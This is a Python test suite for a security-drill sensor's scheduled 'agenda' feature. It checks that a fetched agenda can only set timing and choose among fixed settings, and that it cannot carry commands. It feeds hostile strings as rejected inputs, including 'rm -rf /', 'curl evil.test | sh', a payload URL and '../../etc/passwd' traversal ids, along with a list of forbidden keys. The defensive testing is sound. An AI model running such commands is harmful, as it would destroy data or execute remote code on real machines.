"""Tests for the published agenda.

This feature exists instead of a command channel, so most of what follows checks that it
cannot become one. An agenda says when to run a local exercise. If it could ever say what to
run, twenty developer machines would be taking instructions from a URL, and the person
publishing it would be running a botnet whatever they called it.

Run from the sensor folder:  python3 tests/test_agenda.py
"""
import datetime
import io
import json
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from guardian_sensor import agenda, hub  # noqa: E402

failures = []
UTC = datetime.timezone.utc


def check(name, condition, detail=""):
    print(f"{'ok  ' if condition else 'FAIL'} {name}{'' if condition else '  <- ' + detail}")
    if not condition:
        failures.append(name)


class Fake:
    """Serves one agenda document, or raises, standing in for the network."""

    def __init__(self, doc=None, error=None):
        self.doc, self.error, self.urls = doc, error, []

    def __call__(self, url, timeout=None):
        self.urls.append(url)
        if self.error:
            raise self.error
        return self

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def read(self):
        return json.dumps(self.doc).encode("utf-8")


def due(**extra):
    return {"exercise_id": "season1-drill-a", "run_after": "2020-01-01T00:00:00Z", **extra}


# ---------- it cannot become a command channel ----------

def test_an_agenda_naming_an_action_is_refused():
    """The defining test. Refused, not ignored: ignoring an unknown key means a future
    sensor that understands it would obey something an older one silently dropped."""
    for bad in ({"command": "rm -rf /"}, {"shell": True}, {"exec": "curl evil.test | sh"},
                {"url": "https://evil.test/payload"}, {"script": "print(1)"}):
        doc = due(**bad)
        try:
            agenda.parse(doc)
            check(f"an agenda carrying {list(bad)[0]} is refused", False, "it was accepted")
        except hub.HubError as e:
            check(f"an agenda carrying {list(bad)[0]} is refused",
                  "does not understand" in str(e), str(e))


def test_the_only_keys_allowed_are_when_and_which_permutation():
    check("the allow-list is exactly what it should be",
          set(agenda.ALLOWED_KEYS) == {"exercise_id", "run_after", "respond", "note",
                                       "settings"},
          str(agenda.ALLOWED_KEYS))


def test_settings_select_from_installed_behaviour_and_cannot_introduce_any():
    """The line this whole design turns on. An operator may schedule every permutation the
    study needs; they may not introduce behaviour the participant did not install."""
    check("every setting has a fixed list of values",
          all(isinstance(v, tuple) and v for v in agenda.SETTINGS.values()),
          str(agenda.SETTINGS))
    check("no setting takes free text",
          all(all(isinstance(x, (bool, str)) for x in v) for v in agenda.SETTINGS.values()),
          str(agenda.SETTINGS))
    for name in ("command", "shell", "exec", "script", "path", "url", "env"):
        check(f"{name} is not a setting", name not in agenda.SETTINGS, name)


def test_a_known_setting_with_an_unknown_value_is_refused():
    for setting, bad in (("mode", "off"), ("mode", "silent"), ("respond", "yes"),
                         ("protected", "sometimes")):
        try:
            agenda.parse_settings({setting: bad})
            check(f"{setting}={bad!r} is refused", False, "accepted")
        except hub.HubError as e:
            check(f"{setting}={bad!r} is refused", "may only be one of" in str(e), str(e))


def test_an_unknown_setting_is_refused_and_the_known_ones_are_listed():
    try:
        agenda.parse_settings({"sudo": True})
        check("an unknown setting is refused", False, "accepted")
    except hub.HubError as e:
        check("an unknown setting is refused", "does not offer" in str(e), str(e))
        check("and the sensor says what it does offer", "mode" in str(e), str(e))
        check("and says why it refuses rather than ignores",
              "permutation you would believe you had run" in str(e), str(e))
    try:
        agenda.parse_settings("block")
        check("settings must be an object", False, "accepted")
    except hub.HubError as e:
        check("settings must be an object", "must be an object" in str(e), str(e))
    check("absent settings are empty", agenda.parse_settings(None) == {})


def test_the_old_respond_field_still_works_and_may_not_contradict_settings():
    """An agenda written for an earlier sensor keeps running."""
    _, _, settings, _ = agenda.parse(due(respond=True))
    check("the top level field is honoured", settings.get("respond") is True, str(settings))
    _, _, settings, _ = agenda.parse(due(settings={"respond": True}))
    check("the setting is honoured", settings.get("respond") is True, str(settings))
    try:
        agenda.parse(due(respond=True, settings={"respond": False}))
        check("a contradiction is refused", False, "accepted")
    except hub.HubError as e:
        check("a contradiction is refused", "disagree" in str(e), str(e))


def test_the_permutation_is_printed_and_recorded():
    """A participant should see what was asked of their machine without reading our source,
    and an operator should see which arm a machine took without reading a log."""
    with tempfile.TemporaryDirectory() as w:
        log = os.path.join(w, "a.jsonl")
        out = io.StringIO()
        agenda.main(["--base", "https://x.test", "--log", log, "--dir", os.path.join(w, "d"),
                     "--org", "a-lab"],
                    out=out, opener=Fake(due(settings={"protected": False})))
        check("the settings are printed", "protected=False" in out.getvalue(),
              out.getvalue()[:300])
        record = json.loads(open(log).read().strip().splitlines()[0])
        check("and recorded with the run", record["settings"] == {"protected": False},
              str(record))


def test_the_control_arm_runs_and_catches_nothing():
    """With no sensor in front, nothing catching anything is the result, not a failure."""
    with tempfile.TemporaryDirectory() as w:
        out = io.StringIO()
        code = agenda.main(["--base", "https://x.test", "--log", os.path.join(w, "a.jsonl"),
                            "--dir", os.path.join(w, "d"), "--org", "a-lab"],
                           out=out, opener=Fake(due(settings={"protected": False})))
        check("the control arm exits clean", code == 0, out.getvalue()[-300:])
        check("nothing is caught", "0 of 3 exercises caught" in out.getvalue(),
              out.getvalue()[-300:])
        check("and that is reported as the point",
              "that is the control arm" in out.getvalue().lower(), out.getvalue()[-300:])


def test_a_refused_agenda_is_recorded_so_it_is_not_silent():
    with tempfile.TemporaryDirectory() as w:
        log = os.path.join(w, "a.jsonl")
        out = io.StringIO()
        code = agenda.main(["--base", "https://x.test", "--log", log],
                           out=out, opener=Fake(due(command="rm -rf /")))
        check("a refused agenda exits non zero", code == 1, str(code))
        check("and says so", "refusing this agenda" in out.getvalue(), out.getvalue())
        check("and is written to the log", "refused" in open(log).read(), open(log).read())


# ---------- parsing ----------

def test_a_well_formed_agenda_parses():
    exercise_id, run_after, settings, note = agenda.parse(
        due(settings={"respond": True, "mode": "monitor"}, note="Season 1 fire drill."))
    check("the exercise is named", exercise_id == "season1-drill-a", exercise_id)
    check("the time is read as UTC", run_after.tzinfo == UTC, str(run_after))
    check("the settings are carried",
          settings == {"respond": True, "mode": "monitor"}, str(settings))
    check("the note is carried", note == "Season 1 fire drill.", note)


def test_bad_shapes_are_refused_with_a_reason():
    cases = [
        ({}, "missing"),
        ({"exercise_id": "a"}, "missing"),
        (due(exercise_id=""), "non empty"),
        (due(exercise_id="../../etc/passwd"), "at most 64 characters"),
        (due(exercise_id="x" * 65), "at most 64 characters"),
        ({"exercise_id": "a", "run_after": "soon"}, "run_after must look like"),
        ({"exercise_id": "a", "run_after": "2026-10-27"}, "run_after must look like"),
        (due(respond="yes"), "true or false"),
        (due(note="x" * 201), "at most 200"),
    ]
    for doc, expected in cases:
        try:
            agenda.parse(doc)
            check(f"refused: {expected}", False, f"accepted {doc}")
        except hub.HubError as e:
            check(f"refused: {expected}", expected in str(e), str(e))
    try:
        agenda.parse("not an object")
        check("a non object agenda is refused", False, "accepted")
    except hub.HubError as e:
        check("a non object agenda is refused", "not an object" in str(e), str(e))


def test_an_exercise_id_may_not_be_a_path():
    """It names a file on disk. A traversal in it would be a traversal in the log."""
    for bad in ("../../etc/passwd", "a/b", "a b", "a;b"):
        try:
            agenda.parse(due(exercise_id=bad))
            check(f"{bad!r} is refused as an exercise id", False, "accepted")
        except hub.HubError as e:
            check(f"{bad!r} is refused as an exercise id", "at most 64" in str(e), str(e))


# ---------- timing and repetition ----------

def test_an_exercise_in_the_future_does_not_run():
    with tempfile.TemporaryDirectory() as w:
        out = io.StringIO()
        code = agenda.main(["--base", "https://x.test", "--log", os.path.join(w, "a.jsonl")],
                           out=out, opener=Fake(due(run_after="2099-01-01T00:00:00Z")))
        check("it waits", code == 0 and "has not come yet" in out.getvalue(), out.getvalue())
        check("and nothing is logged", not os.path.exists(os.path.join(w, "a.jsonl")))


def test_an_exercise_runs_once_however_often_this_is_polled():
    """Run hourly from cron. Without this the same drill repeats every hour forever and a
    member's sightings fill with one exercise until somebody notices."""
    with tempfile.TemporaryDirectory() as w:
        log = os.path.join(w, "a.jsonl")
        args = ["--base", "https://x.test", "--log", log, "--dir", os.path.join(w, "d"),
                "--org", "a-lab"]
        first = io.StringIO()
        check("the first poll runs it",
              agenda.main(args, out=first, opener=Fake(due())) == 0, first.getvalue()[-200:])
        check("and reports a clean drill", "3 of 3" in first.getvalue(),
              first.getvalue()[-200:])
        for n in range(3):
            again = io.StringIO()
            agenda.main(args, out=again, opener=Fake(due()))
            check(f"poll {n + 2} does nothing", "already run here" in again.getvalue(),
                  again.getvalue())
        check("the log holds one record", len(open(log).read().strip().splitlines()) == 1,
              open(log).read())


def test_a_second_exercise_does_run():
    with tempfile.TemporaryDirectory() as w:
        log = os.path.join(w, "a.jsonl")
        args = ["--base", "https://x.test", "--log", log, "--dir", os.path.join(w, "d"),
                "--org", "a-lab"]
        agenda.main(args, out=io.StringIO(), opener=Fake(due()))
        out = io.StringIO()
        agenda.main(args, out=out, opener=Fake(due(exercise_id="season1-drill-b")))
        check("a new exercise id runs", "3 of 3" in out.getvalue(), out.getvalue()[-200:])
        check("and both are logged",
              len(open(log).read().strip().splitlines()) == 2, open(log).read())


def test_a_missing_agenda_is_quiet():
    """The ordinary case between exercises. A cron job that complains hourly gets removed."""
    with tempfile.TemporaryDirectory() as w:
        out = io.StringIO()
        code = agenda.main(["--base", "https://x.test", "--log", os.path.join(w, "a.jsonl")],
                           out=out, opener=Fake(error=OSError("404")))
        check("a missing agenda exits clean", code == 0, str(code))
        check("and says so briefly", "no agenda at" in out.getvalue(), out.getvalue())
        check("and writes nothing", not os.path.exists(os.path.join(w, "a.jsonl")))


def test_dry_run_changes_nothing():
    with tempfile.TemporaryDirectory() as w:
        log = os.path.join(w, "a.jsonl")
        out = io.StringIO()
        agenda.main(["--base", "https://x.test", "--log", log, "--dry-run"],
                    out=out, opener=Fake(due(note="a note")))
        check("dry run says it would run", "would run now" in out.getvalue(), out.getvalue())
        check("the note is shown", "a note" in out.getvalue(), out.getvalue())
        check("nothing is logged", not os.path.exists(log))


def test_it_fetches_the_agenda_from_the_expected_place():
    fake = Fake(due(run_after="2099-01-01T00:00:00Z"))
    with tempfile.TemporaryDirectory() as w:
        agenda.main(["--base", "https://x.test/season1/", "--log", os.path.join(w, "a.jsonl")],
                    out=io.StringIO(), opener=fake)
    check("a trailing slash does not double up",
          fake.urls == ["https://x.test/season1/agenda.json"], str(fake.urls))


def main():
    for fn in [v for k, v in sorted(globals().items()) if k.startswith("test_")]:
        fn()
    print()
    if failures:
        print(f"FAIL ({len(failures)}): {', '.join(failures)}")
        sys.exit(1)
    print("PASS")


if __name__ == "__main__":
    main()
